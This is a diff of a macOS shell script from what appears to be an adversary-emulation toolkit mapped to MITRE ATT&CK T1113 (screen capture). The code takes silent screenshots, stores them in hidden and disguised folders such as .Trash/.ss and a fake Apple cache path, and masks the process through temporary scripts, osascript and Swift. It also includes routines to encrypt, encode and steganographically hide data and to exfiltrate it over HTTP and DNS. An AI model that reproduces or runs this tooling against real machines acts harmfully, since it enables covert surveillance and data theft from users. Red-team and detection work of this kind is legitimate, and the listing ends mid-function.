@@ -1,26 +1,26 @@
 #!/bin/sh
-# POSIX-compliant shell script - avoid bashisms
-# Script Name: 1113_screen_capture.sh
-# MITRE ATT&CK Technique: 1113
+# POSIX-compliant
+# Procedure Name: screen_capture
+# Tactic: Collection
+# Technique: T1113
+# GUID: 2465ec97-e235-42a4-b571-b4a35a4d900c
+# Intent: Capture screenshots of the desktop for reconnaissance and data collection
 # Author: @darmado | https://x.com/darmad0
-# Date: 2025-05-28
+# created: 2025-05-28
+# Updated: 2025-05-30
 # Version: 1.0.0
+# License: Apache 2.0
 
-# Description:
-# Capture screenshots of the desktop for reconnaissance and data collection
-# MITRE ATT&CK Tactic: Collection
-# Procedure GUID: 12345678-1234-5678-9abc-123456789013
-# Generated from YAML procedure definition using build_procedure.py
-# The script uses native macOS commands and APIs for maximum compatibility.
+# Core function Info:
+# This is a standalone base script template that can be used to build any technique.
 
 #------------------------------------------------------------------------------
 # Configuration Section
 #------------------------------------------------------------------------------
-
+NAME="" 
 # MITRE ATT&CK Mappings
-TACTIC="Discovery" #replace with you coresponding tactic
-TTP_ID="T1082" #replace with you coresponding ttp_id
-SUBTECHNIQUE_ID=""
+TACTIC="Collection" #replace with you coresponding tactic
+TTP_ID="T1113" #replace with you coresponding ttp_id
 
 TACTIC_ENCRYPT="Defense Evasion" # DO NOT MODIFY
 TTP_ID_ENCRYPT="T1027" # DO NOT MODIFY
@@ -38,7 +38,7 @@ TTP_ID_ENCRYPT_XOR="T1027.007" # DO NOT MODIFY
 JOB_ID=""  # Will be set after core functions are defined
 
 # Script Information
-NAME="1113_screen_capture"
+
 SCRIPT_CMD="$0 $*"
 SCRIPT_STATUS="running"
 OWNER="$USER"
@@ -92,27 +92,6 @@ CMD_WC="wc"
 CMD_CAT="cat"
 CMD_LSOF="lsof"
 
-# Logging Settings
-HOME_DIR="${HOME}"
-LOG_DIR="./logs"  # Simple path to logs in current directory
-LOG_FILE_NAME="${TTP_ID}_${NAME}.log"
-LOG_MAX_SIZE=$((5 * 1024 * 1024))  # 5MB
-LOG_ENABLED=false
-SYSLOG_TAG="${NAME}"
-
-# Default settings
-DEBUG=false
-ALL=false
-SHOW_HELP=false
-STEG_TRANSFORM=false # Enable steganography transformation
-STEG_EXTRACT=false # Extract hidden data from steganography
-STEG_EXTRACT_FILE="" # File to extract hidden data from
-
-# OPSEC Check Settings (enabled by build script based on YAML configuration)
-CHECK_PERMS="false"
-CHECK_FDA="false"
-CHECK_DB_LOCK="false"
-
 SCREENSHOT=false
 DISPLAY=false
 LIST_WINDOWS=false
@@ -134,19 +113,33 @@ SCREENSHOT_PATH="/tmp/ss.jpg"
 HIDDEN_DIR="$HOME/.Trash/.ss"
 CACHE_DIR="$HOME/Library/Caches/com.apple.screencapture"
 
-# MITRE ATT&CK Mappings
-TACTIC="Discovery" #replace with your corresponding tactic
-TTP_ID="T1082" #replace with your corresponding ttp_id
-SUBTECHNIQUE_ID=""
+# Procedure Information (set by build system)
+PROCEDURE_NAME="screen_capture"  # Set by build system from YAML procedure_name field
 
-TACTIC_ENCRYPT="Defense Evasion" # DO NOT MODIFY
-TTP_ID_ENCRYPT="T1027" # DO NOT MODIFY
-TACTIC_ENCODE="Defense Evasion" # DO NOT MODIFY
-TTP_ID_ENCODE="T1140" # DO NOT MODIFY
-TTP_ID_ENCODE_BASE64="T1027.001" # DO NOT MODIFY
-TTP_ID_ENCODE_HEX="T1027" # DO NOT MODIFY
-TTP_ID_ENCODE_PERL="T1059.006" # DO NOT MODIFY
-TTP_ID_ENCODE_PERL_UTF8="T1027.010" # DO NOT MODIFY
+# Function execution tracking
+FUNCTION_LANG=""  # Ued by log_output at execution time
+
+# Logging Settings
+HOME_DIR="${HOME}"
+LOG_DIR="./logs"  # Simple path to logs in current directory
+LOG_FILE_NAME="${TTP_ID}_${PROCEDURE_NAME}.log"
+LOG_MAX_SIZE=$((5 * 1024 * 1024))  # 5MB
+LOG_ENABLED=false
+SYSLOG_TAG="${TTP_ID}_${PROCEDURE_NAME}"
+
+# Default settings
+DEBUG=false
+ALL=false
+SHOW_HELP=false
+STEG_TRANSFORM=false # Enable steganography transformation
+STEG_EXTRACT=false # Extract hidden data from steganography
+STEG_EXTRACT_FILE="" # File to extract hidden data from
+
+# OPSEC Check Settings (enabled by build script based on YAML configuration)
+CHECK_PERMS="false"
+CHECK_FDA="false"
+CHECK_DB_LOCK="false"
+
 
 # Output Configuration
 FORMAT=""          # json, csv, or empty for raw
@@ -182,7 +175,7 @@ DEFAULT_STEG_CARRIER="/System/Library/Desktop Pictures/Monterey Graphic.heic"
 # Purpose: Get the current timestamp in a consistent format
 # Inputs: None
 # Outputs: Timestamp string in "YYYY-MM-DD HH:MM:SS" format
-# Side Effects: None
+# - None
 core_get_timestamp() {
     # Use direct command to avoid variable expansion issues
     date "+%Y-%m-%d %H:%M:%S"
@@ -191,7 +184,7 @@ core_get_timestamp() {
 # Purpose: Generate a unique job ID for tracking script execution
 # Inputs: None
 # Outputs: 8-character hexadecimal job ID
-# Side Effects: None
+# - None
 core_generate_job_id() {
     # Use openssl to generate random hex string for job tracking
     # Fallback to date-based ID if openssl not available
@@ -209,7 +202,7 @@ core_generate_job_id() {
 # Purpose: Print debug messages to stderr when debug mode is enabled
 # Inputs: $1 - Message to print
 # Outputs: None (prints directly to stderr)
-# Side Effects: Writes to stderr if DEBUG=true
+# - Writes to stderr if DEBUG=true
 core_debug_print() {
     if [ "$DEBUG" = true ]; then
         local timestamp=$(core_get_timestamp)
@@ -220,12 +213,12 @@ core_debug_print() {
 # Purpose: Print verbose messages to stdout when verbose mode is enabled
 # Inputs: $1 - Message to print
 # Outputs: None (prints directly to stdout)
-# Side Effects: Writes to stdout if VERBOSE=true
+# - Writes to stdout if VERBOSE=true
 
 # Purpose: Handle errors consistently with proper formatting and logging
 # Inputs: $1 - Error message
 # Outputs: None (prints directly to stderr)
-# Side Effects: 
+# - 
 #   - Writes to stderr
 #   - Logs error message if LOG_ENABLED=true
 #   - Returns error code 1
@@ -247,7 +240,7 @@ core_handle_error() {
 #   $2 - Status type (info, error, etc.), defaults to "info"
 #   $3 - Skip data flag (true/false), defaults to false
 # Outputs: None
-# Side Effects:
+# 
 #   - Creates log directory if it doesn't exist
 #   - Writes to log file if LOG_ENABLED=true
 #   - Rotates log file if size exceeds LOG_MAX_SIZE
@@ -260,7 +253,7 @@ core_log_output() {
     
     if [ "$LOG_ENABLED" = true ]; then
         # Ensure log directory exists
-        if [ ! -d "$LOG_DIR" ]; then
+            if [ ! -d "$LOG_DIR"  ] || [ ! -f "$LOG_DIR/$LOG_FILE_NAME" ]; then
             $CMD_MKDIR -p "$LOG_DIR" 2>/dev/null || {
                 $CMD_PRINTF "Warning: Failed to create log directory.\n" >&2
                 return 1
@@ -274,7 +267,7 @@ core_log_output() {
         fi
         
         # Log detailed entry
-        "$CMD_PRINTF" "[%s] [%s] [PID:%d] [job:%s] owner=%s parent=%s ttp_id=%s tactic=%s format=%s encoding=%s encryption=%s exfil=%s status=%s\\n" \
+        "$CMD_PRINTF" "[%s] [%s] [PID:%d] [job:%s] owner=%s parent=%s ttp_id=%s tactic=%s format=%s encoding=%s encryption=%s exfil=%s language=%s status=%s\\n" \
             "$(core_get_timestamp)" \
             "$status" \
             "$$" \
@@ -286,7 +279,9 @@ core_log_output() {
             "${FORMAT:-raw}" \
             "$ENCODING_TYPE" \
             "${ENCRYPTION_TYPE:-none}" \
-            "${EXFIL_TYPE:-none}" >> "$LOG_DIR/$LOG_FILE_NAME"
+            "${EXFIL_TYPE:-none}" \
+            "${FUNCTION_LANG:-shell}" \
+            "$status" >> "$LOG_DIR/$LOG_FILE_NAME"
             
         if [ "$skip_data" = "false" ] && [ -n "$output" ]; then
             "$CMD_PRINTF" "command: %s\\ndata:\\n%s\\n---\\n" \
@@ -298,7 +293,7 @@ core_log_output() {
         fi
 
         # Also log to syslog
-        $CMD_LOGGER -t "$SYSLOG_TAG" "job=${JOB_ID:-NOJOB} status=$status ttp_id=$TTP_ID tactic=$TACTIC exfil=${EXFIL_TYPE:-none} encoding=$ENCODING_TYPE encryption=${ENCRYPTION_TYPE:-none} cmd=\"$SCRIPT_CMD\""
+        $CMD_LOGGER -t "$SYSLOG_TAG" "job=${JOB_ID:-NOJOB} status=$status ttp_id=$TTP_ID tactic=$TACTIC exfil=${EXFIL_TYPE:-none} encoding=$ENCODING_TYPE encryption=${ENCRYPTION_TYPE:-none} language=${FUNCTION_LANG:-shell} cmd=\"$SCRIPT_CMD\""
     fi
     
     # Output to stdout if in debug mode only
@@ -312,7 +307,7 @@ core_log_output() {
 #  $1 - Input string to validate
 #  $2 - Validation type (string|integer|domain|url|file_path)
 #Outputs: 0 if valid, 1 if invalid
-#Side Effects: Prints error message to stderr on validation failure
+#- Prints error message to stderr on validation failure
 core_validate_input() {
     local input="$1"
     local validation_type="$2"
@@ -387,7 +382,7 @@ core_validate_input() {
 # Purpose: Extract domain from URL for validation
 # Inputs: $1 - URL string
 # Outputs: Domain part of URL
-# Side Effects: None
+# - None
 core_extract_domain_from_url() {
     local url="$1"
     "$CMD_PRINTF"  "$url" | sed -E 's~^https?://([^/:]+).*~\1~'
@@ -396,7 +391,7 @@ core_extract_domain_from_url() {
 # Purpose: Validate that essential commands are available before script execution
 # Inputs: None
 # Outputs: None
-# Side Effects:
+# Logic:
 #   - Returns 1 if any essential command is missing
 #   - Calls core_handle_error on missing commands
 core_validate_command() {
@@ -420,7 +415,7 @@ core_validate_command() {
 # Purpose: Check if a domain resolves to a valid IP address
 # Inputs: $1 - Domain to check
 # Outputs: 0 if domain resolves, 1 if not
-# Side Effects: Prints error message if domain doesn't resolve
+# - Prints error message if domain doesn't resolve
 core_validate_domain() {
     local domain="$1"
     
@@ -457,7 +452,7 @@ core_validate_domain() {
 # Purpose: Parse command-line arguments and set global variables (NO VALIDATION)
 # Inputs: $@ - All command-line arguments passed to the script
 # Outputs: None
-# Side Effects: Sets global flag variables based on command-line options
+# - Sets global flag variables based on command-line options
 core_parse_args() {
     # Track unknown arguments and missing values for error reporting
     UNKNOWN_ARGS=""
@@ -734,7 +729,7 @@ EOF
 #   $1 - Raw output data to process
 #   $2 - Data source identifier (defaults to "generic")
 # Outputs: Processed output (formatted/encoded/encrypted as requested)
-# Side Effects:
+# Logic:
 #   - May set global ENCODING_TYPE and ENCRYPTION_TYPE variables
 core_process_output() {
     local output="$1"
@@ -748,10 +743,10 @@ core_process_output() {
     if [ -n "$FORMAT" ]; then
         if [ "$FORMAT" = "json" ] || [ "$FORMAT" = "JSON" ]; then
             # For JSON, only use raw data here - we'll add transformation metadata at the end
-            processed=$(core_format_output "$output" "$FORMAT" "$data_source" "false" "none" "false" "none" "false")
+            processed=$(core_format_output "$output" "$FORMAT" "$PROCEDURE_NAME" "false" "none" "false" "none" "false")
         else
             # For other formats, just format the raw output
-            processed=$(core_format_output "$output" "$FORMAT" "$data_source")
+            processed=$(core_format_output "$output" "$FORMAT" "$PROCEDURE_NAME")
         fi
         core_debug_print "Output formatted as $FORMAT"
     fi
@@ -798,7 +793,7 @@ core_process_output() {
 #   $3 - Data source identifier (defaults to "generic")
 #   $4-7 - Additional parameters for JSON metadata
 # Outputs: Formatted data
-# Side Effects: None
+# - None
 core_format_output() {
     local output="$1"
     local format="$2"
@@ -814,7 +809,7 @@ core_format_output() {
     
     case "$format" in
         json|json-lines)
-            formatted=$(core_format_as_json "$output" "$data_source" "$is_encoded" "$encoding" "$is_encrypted" "$encryption" "$is_steganography")
+            formatted=$(core_format_as_json "$output" "$PROCEDURE_NAME" "$is_encoded" "$encoding" "$is_encrypted" "$encryption" "$is_steganography")
             ;;
         csv)
             formatted=$(core_format_as_csv "$output")
@@ -837,7 +832,7 @@ core_format_output() {
 #   $6 - Encryption method
 #   $7 - Whether steganography is used (true/false)
 # Outputs: JSON-formatted string with data and metadata
-# Side Effects: None
+# - None
 core_format_as_json() {
     local output="$1"
     local data_source="${2:-generic}"
@@ -858,7 +853,7 @@ core_format_as_json() {
     json_output="$json_output
   \"jobId\": \"$JOB_ID\","
     json_output="$json_output
-  \"dataSource\": \"$data_source\","
+  \"procedure\": \"$PROCEDURE_NAME\","
     
     # Always include encoding and encryption status
         json_output="$json_output
@@ -961,7 +956,7 @@ core_format_as_csv() {
 #   $1 - Output data to encode
 #   $2 - Encoding method (base64/b64, hex, perl_b64, perl_utf8)
 # Outputs: Encoded data according to specified method
-# Side Effects: None
+# - None
 core_encode_output() {
     local output="$1"
     local encode_type="$2"
@@ -1003,7 +998,7 @@ core_encode_output() {
 #   $2 - Encryption method (none|aes|gpg|xor)
 #   $3 - Encryption key (optional, uses ENCRYPT_KEY global if not provided)
 # Outputs: Encrypted data or original data if no encryption
-# Side Effects: None (delegated to specific encryption functions)
+# - None (delegated to specific encryption functions)
 core_encrypt_output() {
     local data="$1"
     local method="$2"
@@ -1051,7 +1046,7 @@ core_encrypt_output() {
 #   $1 - Data to encrypt
 #   $2 - Encryption key
 # Outputs: AES-256-CBC encrypted data in base64 format
-# Side Effects:
+# Logic:
 #   - Sets global ENCRYPTION_TYPE to "aes" on success
 #   - Writes error message to stderr on failure
 encrypt_with_aes() {
@@ -1078,7 +1073,7 @@ encrypt_with_aes() {
 #   $1 - Data to encrypt
 #   $2 - Encryption key
 # Outputs: GPG symmetrically encrypted data in ASCII armor format
-# Side Effects:
+# Logic:
 #   - Sets global ENCRYPTION_TYPE to "gpg" on success
 #   - Writes error message to stderr on failure/if GPG not found
 encrypt_with_gpg() {
@@ -1105,7 +1100,7 @@ encrypt_with_gpg() {
 #   $1 - Data to encrypt
 #   $2 - Encryption key
 # Outputs: XOR encrypted data in base64 format
-# Side Effects:
+# Logic:
 #   - Sets global ENCRYPTION_TYPE to "xor" on success
 #   - When used with exfiltration, the key is sent via DNS TXT record or included in HTTP payload
 encrypt_with_xor() {
@@ -1145,7 +1140,7 @@ encrypt_with_xor() {
 # Purpose: URL-safe encode data for HTTP/HTTPS exfiltration
 # Inputs: $1 - Data to encode
 # Outputs: Base64 URL-safe encoded data
-# Side Effects: None
+# - None
 core_url_safe_encode() {
     local data="$1"
     local encoded
@@ -1162,7 +1157,7 @@ core_url_safe_encode() {
 # Purpose: DNS-safe encode data for DNS exfiltration
 # Inputs: $1 - Data to encode  
 # Outputs: Base64 DNS-safe encoded data
-# Side Effects: None
+# - None
 core_dns_safe_encode() {
     local data="$1"
     local encoded
@@ -1179,7 +1174,7 @@ core_dns_safe_encode() {
 # Purpose: Generate user agent string for HTTP requests
 # Inputs: None
 # Outputs: User agent string
-# Side Effects: None
+# - None
 core_get_user_agent() {
     $CMD_PRINTF "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15"
 }
@@ -1187,7 +1182,7 @@ core_get_user_agent() {
 # Purpose: Prepare proxy argument for curl if needed
 # Inputs: None - uses global PROXY_URL variable
 # Outputs: Proxy argument for curl or empty string
-# Side Effects: May modify global PROXY_URL to add protocol prefix
+# - May modify global PROXY_URL to add protocol prefix
 core_prepare_proxy_arg() {
     local proxy_arg=""
     
@@ -1204,7 +1199,7 @@ core_prepare_proxy_arg() {
 # Purpose: Normalize URI by ensuring it has http:// prefix
 # Inputs: $1 - URI to normalize
 # Outputs: Normalized URI with protocol prefix
-# Side Effects: None
+# - None
 core_normalize_uri() {
     local uri="$1"
     
@@ -1217,7 +1212,7 @@ core_normalize_uri() {
 # Purpose: Extract domain from a full URI
 # Inputs: $1 - Full URI
 # Outputs: Domain part of the URI
-# Side Effects: None
+# - None
 core_extract_domain() {
     local uri="$1"
     "$CMD_PRINTF" '%s' "$uri" | sed -E 's~^https?://([^/:]+).*~\1~'
@@ -1227,7 +1222,7 @@ core_extract_domain() {
 # Inputs: 
 #   $1 - Raw data
 # Outputs: Data with optional start/end markers
-# Side Effects: None (uses global EXFIL_START/EXFIL_END)
+# - None (uses global EXFIL_START/EXFIL_END)
 core_prepare_exfil_data() {
     local data="$1"
     
@@ -1245,7 +1240,7 @@ core_prepare_exfil_data() {
 # Inputs:
 #   $1 - Domain to send key to
 # Outputs: Encrypted key (base64) if DNS sending failed, empty otherwise
-# Side Effects: Makes DNS request
+# - Makes DNS request
 core_send_key_via_dns() {
     local domain="$1"
     local encrypted_key=""
@@ -1288,7 +1283,7 @@ core_send_key_via_dns() {
 #   $1 - Encoded data
 #   $2 - Optional encrypted key (empty if key sent via DNS)
 # Outputs: JSON payload string
-# Side Effects: None
+# - None
 core_generate_json_payload() {
     local encoded_data="$1"
     local encrypted_key="$2"
@@ -1332,7 +1327,7 @@ EOF
 # Purpose: Determine appropriate content type for HTTP exfiltration
 # Inputs: None (uses global ENCODE variable)
 # Outputs: Content type string
-# Side Effects: None
+# - None
 core_get_content_type() {
     local content_type="text/plain"
     if [ "$ENCODE" = "base64" ] || [ "$ENCODE" = "b64" ]; then
@@ -1347,7 +1342,7 @@ core_get_content_type() {
 # Inputs:
 #   $1 - Data to exfiltrate
 # Outputs: None
-# Side Effects: Makes HTTP request
+# - Makes HTTP request
 core_exfil_http_post() {
     local data="$1"
     local full_uri=$(core_normalize_uri "$EXFIL_URI")
@@ -1393,7 +1388,7 @@ core_exfil_http_post() {
 # Inputs:
 #   $1 - Data to exfiltrate
 # Outputs: None
-# Side Effects: Makes multiple HTTP requests
+# - Makes multiple HTTP requests
 core_exfil_http_get() {
     local data="$1"
     local full_uri=$(core_normalize_uri "$EXFIL_URI")
@@ -1467,7 +1462,7 @@ core_exfil_http_get() {
 # Inputs:
 #   $1 - Data to exfiltrate
 # Outputs: None
-# Side Effects: Makes multiple DNS requests
+# - Makes multiple DNS requests
 core_exfil_dns() {
     local data="$1"
     
@@ -1543,7 +1538,7 @@ core_exfil_dns() {
 # Inputs:
 #   $1 - Data to exfiltrate
 # Outputs: None
-# Side Effects:
+# Logic:
 #   - Logs exfiltration attempt if LOG_ENABLED=true
 #   - Performs network requests to exfiltrate data
 #   - May modify data for transport (encoding, chunking)
@@ -1597,7 +1592,7 @@ core_exfiltrate_data() {
 # Inputs:
 #   $1 - Processed data (after formatting/encoding/encryption)
 # Outputs: None (writes to various destinations)
-# Side Effects:
+# Logic:
 #   - Logs output if LOG_ENABLED=true
 #   - Exfiltrates data if EXFIL=true
 #   - Always prints data to stdout
@@ -1629,7 +1624,7 @@ core_transform_output() {
 # Purpose: Extract hidden data from a steganography image
 # Inputs: $1 - Image file with hidden data
 # Outputs: Extracted and decoded data
-# Side Effects: None
+# - None
 core_extract_steganography() {
     local steg_file="$1"
     
@@ -1665,7 +1660,7 @@ core_extract_steganography() {
 # Purpose: Perform steganography by hiding data in an image
 # Inputs: None (uses global variables)
 # Outputs: Status message
-# Side Effects: Creates output image file
+# - Creates output image file
 core_steganography() {
     # Define local variables
     local message=""
@@ -1738,7 +1733,7 @@ core_steganography() {
 # Purpose: Apply steganography to data in the processing pipeline
 # Inputs: $1 - Data to hide in steganography
 # Outputs: Status message (actual data is written to file)
-# Side Effects: Creates output image file
+# - Creates output image file
 core_apply_steganography() {
     local data_to_hide="$1"
     local carrier_image=""
@@ -1781,7 +1776,7 @@ core_apply_steganography() {
 #   $3 - Write permission required (true/false)
 #   $4 - Execute permission required (true/false)
 # Outputs: 0 if all required permissions are granted, 1 if any required permission is missing
-# Side Effects: Logs debug information
+# - Logs debug information
 core_check_perms() {
     local file="$1"
     local read_required="$2"
@@ -1810,7 +1805,7 @@ core_check_perms() {
     return 0
 }
 
-# Side Effects: None
+# - None
 # Note: Simple implementation for YAML check_fda
 core_check_fda() {
     [ -f "$TCC_SYSTEM_DB" ] && [ -r "$TCC_SYSTEM_DB" ] && [ -f "$TCC_USER_DB" ] && [ -r "$TCC_USER_DB" ]
@@ -1819,7 +1814,7 @@ core_check_fda() {
 # Purpose: Check if database is locked by another process
 # Inputs: $1 - Database path
 # Outputs: 0 if database is not locked, 1 if locked
-# Side Effects: None
+# - None
 # Note: Comprehensive implementation checking lock files, processes, and database state
 core_check_db_lock() {
     local db_path="$1"
@@ -1910,6 +1905,9 @@ core_main() {
         # Execute script-specific logic here
 # Execute main logic
 raw_output=""
+
+# Set global function language for this procedure
+FUNCTION_LANG="applescript,python,shell,swift"
 
 # Execute functions for -s|--screenshot
 if [ "$SCREENSHOT" = true ]; then
@@ -2041,8 +2039,8 @@ if [ "$ALL_METHODS" = true ]; then
     raw_output="${raw_output}${result}\n"
 fi
 
-# Set data source
-data_source="1113_screen_capture"
+# Set procedure name for processing
+procedure="screen_capture"
         # This section is intentionally left empty as it will be filled by
         # technique-specific implementations when sourcing this base script
         # If no raw_output is set by the script, exit gracefully
@@ -2051,7 +2049,7 @@ data_source="1113_screen_capture"
         fi  
     fi
     # Process the output (format, encode, encrypt)
-    processed_output=$(core_process_output "$raw_output" "$data_source")
+    processed_output=$(core_process_output "$raw_output" "$PROCEDURE_NAME")
     
     # Handle the final output (log, exfil, or display)
     core_transform_output "$processed_output"
@@ -2061,7 +2059,7 @@ data_source="1113_screen_capture"
 # Purpose: Validate parsed arguments for correctness and security
 # Inputs: None (uses global variables set by core_parse_args)
 # Outputs: 0 if valid, 1 if invalid
-# Side Effects: Prints error messages for invalid arguments but continues execution
+# - Prints error messages for invalid arguments but continues execution
 core_validate_parsed_args() {
     local validation_errors=""
     local has_valid_actions=false
@@ -2193,7 +2191,7 @@ core_validate_parsed_args() {
 # Purpose: Generate encryption key if encryption is enabled
 # Inputs: None (uses global ENCRYPT variable)
 # Outputs: None
-# Side Effects: Sets global ENCRYPT_KEY variable
+# - Sets global ENCRYPT_KEY variable
 core_generate_encryption_key() {
     if [ "$ENCRYPT" != "none" ]; then
         ENCRYPT_KEY=$("$CMD_PRINTF" '%s' "$JOB_ID$(date +%s%N)$RANDOM" | $CMD_OPENSSL dgst -sha256 | cut -d ' ' -f 2)
@@ -2211,16 +2209,16 @@ core_generate_encryption_key() {
 # Function: capture_screenshot
 # Description: Capture a silent screenshot
 capture_screenshot() {
-    $CMD_PRINTF "SCREENSHOT|capturing|Silent screenshot\\n"
+    printf "SCREENSHOT|capturing|Silent screenshot\\n"
     
     # Capture screenshot silently (no sound, no UI)
     screencapture -x "$SCREENSHOT_PATH"
     
     if [ -f "$SCREENSHOT_PATH" ]; then
         file_size=$(stat -f%z "$SCREENSHOT_PATH")
-        $CMD_PRINTF "SCREENSHOT|captured|%s (%s bytes)\\n" "$SCREENSHOT_PATH" "$file_size"
+        printf "SCREENSHOT|captured|%s (%s bytes)\\n" "$SCREENSHOT_PATH" "$file_size"
     else
-        $CMD_PRINTF "SCREENSHOT|failed|Could not capture screenshot\\n"
+        printf "SCREENSHOT|failed|Could not capture screenshot\\n"
     fi
 }
 
@@ -2228,24 +2226,24 @@ capture_screenshot() {
 # Function: capture_screenshot_with_info
 # Description: Capture screenshot and display info
 capture_screenshot_with_info() {
-    $CMD_PRINTF "SCREENSHOT|capturing|Screenshot with display info\\n"
+    printf "SCREENSHOT|capturing|Screenshot with display info\\n"
     
     # Get display information first
-    display_count=$(system_profiler SPDisplaysDataType | $CMD_GREP -c "Resolution:")
-    $CMD_PRINTF "SCREENSHOT|displays|%s\\n" "$display_count"
+    display_count=$(system_profiler SPDisplaysDataType | grep -c "Resolution:")
+    printf "SCREENSHOT|displays|%s\\n" "$display_count"
     
     # Capture screenshot
     screencapture -x "$SCREENSHOT_PATH"
     
     if [ -f "$SCREENSHOT_PATH" ]; then
         file_size=$(stat -f%z "$SCREENSHOT_PATH")
-        $CMD_PRINTF "SCREENSHOT|captured|%s (%s bytes)\\n" "$SCREENSHOT_PATH" "$file_size"
+        printf "SCREENSHOT|captured|%s (%s bytes)\\n" "$SCREENSHOT_PATH" "$file_size"
         
         # Get image dimensions
         image_info=$(file "$SCREENSHOT_PATH")
-        $CMD_PRINTF "SCREENSHOT|info|%s\\n" "$image_info"
+        printf "SCREENSHOT|info|%s\\n" "$image_info"
     else
-        $CMD_PRINTF "SCREENSHOT|failed|Could not capture screenshot\\n"
+        printf "SCREENSHOT|failed|Could not capture screenshot\\n"
     fi
 }
 
@@ -2257,16 +2255,16 @@ capture_hidden_screenshot() {
     mkdir -p "$HOME/.Trash/.ss" 2>/dev/null
     local output_path="$HOME/.Trash/.ss/$(date +%Y%m%d_%H%M%S).jpg"
     
-    $CMD_PRINTF "HIDDEN_SCREENSHOT|capturing|Using hidden storage in .Trash\\n"
+    printf "HIDDEN_SCREENSHOT|capturing|Using hidden storage in .Trash\\n"
     
     # Direct screencapture to hidden location
     screencapture -x "$output_path" 2>/dev/null
     
     if [ -f "$output_path" ]; then
-        file_size=$(stat -f%z "$output_path" 2>/dev/null || $CMD_PRINTF "%s\n" "unknown")
-        $CMD_PRINTF "HIDDEN_SCREENSHOT|captured|%s (%s bytes)\\n" "$output_path" "$file_size"
+        file_size=$(stat -f%z "$output_path" 2>/dev/null || echo "unknown")
+        printf "HIDDEN_SCREENSHOT|captured|%s (%s bytes)\\n" "$output_path" "$file_size"
     else
-        $CMD_PRINTF "HIDDEN_SCREENSHOT|failed|capture failed\\n"
+        printf "HIDDEN_SCREENSHOT|failed|capture failed\\n"
         return 1
     fi
 }
@@ -2280,12 +2278,12 @@ capture_masquerade_screenshot() {
     mkdir -p "$random_dir" 2>/dev/null
     local output_path="$random_dir/temp_$(date +%s).jpg"
     
-    $CMD_PRINTF "MASQUERADE_SCREENSHOT|capturing|Using process name masquerading\\n"
+    printf "MASQUERADE_SCREENSHOT|capturing|Using process name masquerading\\n"
     
     # Create a temporary script that runs screencapture
     local temp_script="/tmp/capture_$(openssl rand -hex 4).sh"
-    $CMD_PRINTF "%s\n" "#!/bin/sh" > "$temp_script"
-    $CMD_PRINTF "%s\n" "screencapture -x '$output_path'" >> "$temp_script"
+    echo "#!/bin/sh" > "$temp_script"
+    echo "screencapture -x '$output_path'" >> "$temp_script"
     chmod +x "$temp_script"
     
     # Execute via temporary script (hides screencapture in process list)
@@ -2293,10 +2291,10 @@ capture_masquerade_screenshot() {
     rm -f "$temp_script" 2>/dev/null
     
     if [ -f "$output_path" ]; then
-        file_size=$(stat -f%z "$output_path" 2>/dev/null || $CMD_PRINTF "%s\n" "unknown")
-        $CMD_PRINTF "MASQUERADE_SCREENSHOT|captured|%s (%s bytes)\\n" "$output_path" "$file_size"
+        file_size=$(stat -f%z "$output_path" 2>/dev/null || echo "unknown")
+        printf "MASQUERADE_SCREENSHOT|captured|%s (%s bytes)\\n" "$output_path" "$file_size"
     else
-        $CMD_PRINTF "MASQUERADE_SCREENSHOT|failed|capture failed\\n"
+        printf "MASQUERADE_SCREENSHOT|failed|capture failed\\n"
         return 1
     fi
 }
@@ -2309,16 +2307,16 @@ capture_cache_screenshot() {
     mkdir -p "$HOME/Library/Caches/com.apple.screencapture" 2>/dev/null
     local output_path="$HOME/Library/Caches/com.apple.screencapture/capture_$(date +%s).jpg"
     
-    $CMD_PRINTF "CACHE_SCREENSHOT|capturing|Using realistic cache directory\\n"
+    printf "CACHE_SCREENSHOT|capturing|Using realistic cache directory\\n"
     
     # Direct screencapture to cache location
     screencapture -x "$output_path" 2>/dev/null
     
     if [ -f "$output_path" ]; then
-        file_size=$(stat -f%z "$output_path" 2>/dev/null || $CMD_PRINTF "%s\n" "unknown")
-        $CMD_PRINTF "CACHE_SCREENSHOT|captured|%s (%s bytes)\\n" "$output_path" "$file_size"
+        file_size=$(stat -f%z "$output_path" 2>/dev/null || echo "unknown")
+        printf "CACHE_SCREENSHOT|captured|%s (%s bytes)\\n" "$output_path" "$file_size"
     else
-        $CMD_PRINTF "CACHE_SCREENSHOT|failed|capture failed\\n"
+        printf "CACHE_SCREENSHOT|failed|capture failed\\n"
         return 1
     fi
 }
@@ -2331,16 +2329,16 @@ capture_osascript_screenshot() {
     mkdir -p "$HOME/.Trash/.ss" 2>/dev/null
     local output_path="$HOME/.Trash/.ss/osascript_$(date +%Y%m%d_%H%M%S).jpg"
     
-    $CMD_PRINTF "OSASCRIPT_SCREENSHOT|capturing|Using osascript/AppleScript interpreter\\n"
+    printf "OSASCRIPT_SCREENSHOT|capturing|Using osascript/AppleScript interpreter\\n"
     
     # Use osascript to execute screencapture (may prompt for automation permissions)
     osascript -e "tell application \"System Events\" to do shell script \"screencapture -x '$output_path'\"" 2>/dev/null
     
     if [ -f "$output_path" ]; then
-        file_size=$(stat -f%z "$output_path" 2>/dev/null || $CMD_PRINTF "%s\n" "unknown")
-        $CMD_PRINTF "OSASCRIPT_SCREENSHOT|captured|%s (%s bytes)\\n" "$output_path" "$file_size"
+        file_size=$(stat -f%z "$output_path" 2>/dev/null || echo "unknown")
+        printf "OSASCRIPT_SCREENSHOT|captured|%s (%s bytes)\\n" "$output_path" "$file_size"
     else
-        $CMD_PRINTF "OSASCRIPT_SCREENSHOT|failed|capture failed (may need automation permissions)\\n"
+        printf "OSASCRIPT_SCREENSHOT|failed|capture failed (may need automation permissions)\\n"
         return 1
     fi
 }
@@ -2352,34 +2350,34 @@ capture_swift_screenshot() {
     mkdir -p "$HOME/Library/Caches/com.apple.screencapture" 2>/dev/null
     local output_path="$HOME/Library/Caches/com.apple.screencapture/swift_$(date +%s).jpg"
     
-    $CMD_PRINTF "SWIFT_SCREENSHOT|capturing|Using Swift Process class (standard library)\\n"
+    printf "SWIFT_SCREENSHOT|capturing|Using Swift Process class (standard library)\\n"
     
     # Create temporary Swift script (no external dependencies)
     local swift_script="/tmp/screenshot_$(openssl rand -hex 4).swift"
-    $CMD_PRINTF "%s\n" 'import Foundation' > "$swift_script"
-    $CMD_PRINTF "%s\n" 'let outputPath = CommandLine.arguments[1]' >> "$swift_script"
-    $CMD_PRINTF "%s\n" 'let process = Process()' >> "$swift_script"
